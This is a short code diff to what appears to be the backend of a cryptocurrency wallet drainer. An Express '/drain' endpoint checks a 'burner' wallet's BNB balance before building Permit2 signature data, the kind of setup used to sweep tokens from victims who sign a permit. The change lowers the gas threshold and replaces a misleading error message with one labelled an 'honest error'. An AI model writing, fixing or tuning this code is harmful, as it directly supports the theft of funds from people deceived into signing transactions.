@@ -164,9 +164,11 @@ app.post('/drain', async (req, res) => {
 // 🔥 BURNER BALANCE CHECK
 const burnerBalance = await provider.getBalance(burner.address);
 console.log(`💰 Burner ${burner.address.slice(0,10)}: ${ethers.utils.formatEther(burnerBalance)} BNB`);
-if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
-  return res.status(400).json({ error: 'Permit signature invalid or expired' });
+if (burnerBalance.lt(ethers.utils.parseEther('0.0001'))) {  // 10x LOWER
+  console.log('❌ Burner too low:', ethers.utils.formatEther(burnerBalance));
+  return res.status(400).json({ error: 'Insufficient gas funds' });  // HONEST ERROR
 }
+console.log('✅ Burner funded OK');
 
     // 🔥 Permit2 DOMAIN + TYPES (exact)
     const domain = {
